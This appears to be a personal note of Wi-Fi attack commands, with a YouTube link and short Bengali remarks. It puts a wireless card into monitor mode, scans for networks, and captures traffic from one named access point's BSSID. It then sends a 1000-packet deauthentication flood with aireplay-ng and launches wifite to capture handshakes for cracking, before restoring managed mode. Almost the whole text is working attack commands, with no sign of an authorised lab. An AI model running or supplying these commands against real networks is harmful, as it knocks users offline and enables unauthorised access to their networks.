youtube link : https://youtu.be/vzQ9n4LA6q4?si=mXWgOl4FPyuRLP9n

<br><br>

sudo airmon-ng start wlan0 <br>

iwconfig<br>

sudo ifconfig wlan0 down <br>

airmon-ng check kill<br>

sudo airmon-ng check kill<br>

sudo iwconfig wlan0 mode monitor<br>

sudo iwconfig wlan0 mode manage <br>

iwconfig<br>


<br>

............root e gelam......<br>

sudo su<br>

airmon-ng start wlan0<br>

airodump-ng wlan0                    (for 2.4GHz network)<br>
airodump-ng --band a wlan0           (for 5GHz network)<br>
airodump-ng --band abg wlan0          (for 2.4 GHz and 5 GHz)<br>

ctrl + c<br>


-- > (airodump-ng --bssid bssid --chanel channel --write filename wlan0) <br>
C8:34:8E:46:99:95<br>
airodump-ng --bssid 50:0F:F5:90:29:A5 --channel 40 --write B9File wlan0<br>

wireshark<br>

airodump-ng --bssid 50:0F:F5:90:29:A5 --channel 40 --write wifi5ghz wlan0<br>

aireplay-ng --deauth 1000 -a 50:0F:F5:90:29:A5 wlan0<br>

wifit <br>

---------------sesh -------------<br>
sudo ip link set wlan0 down<br>
sudo iwconfig wlan0 mode managed<br>
sudo ip link set wlan0 up<br>

sudo systemctl restart NetworkManager<br>